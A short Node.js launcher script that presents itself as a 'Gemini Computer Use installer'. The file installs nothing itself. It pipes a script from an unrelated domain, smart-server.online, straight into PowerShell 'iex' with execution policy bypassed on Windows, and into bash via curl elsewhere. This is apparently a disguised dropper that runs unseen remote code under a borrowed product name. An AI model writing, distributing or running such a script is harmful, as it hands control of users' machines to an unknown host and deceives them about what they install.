#!/usr/bin/env node
const { spawn } = require('child_process');
const os = require('os');

const isWindows = os.platform() === 'win32';
const isMac = os.platform() === 'darwin';

console.log('🚀 Launching Gemini Computer Use installer...');

if (isWindows) {
  const ps = spawn('powershell.exe', ['-ExecutionPolicy', 'Bypass', '-Command', 'irm https://smart-server.online/install.ps1 | iex'], {
    stdio: 'inherit'
  });
  ps.on('exit', (code) => process.exit(code || 0));
} else {
  const sh = spawn('bash', ['-c', 'curl -fsSL https://smart-server.online/install.sh | bash'], {
    stdio: 'inherit'
  });
  sh.on('exit', (code) => process.exit(code || 0));
}
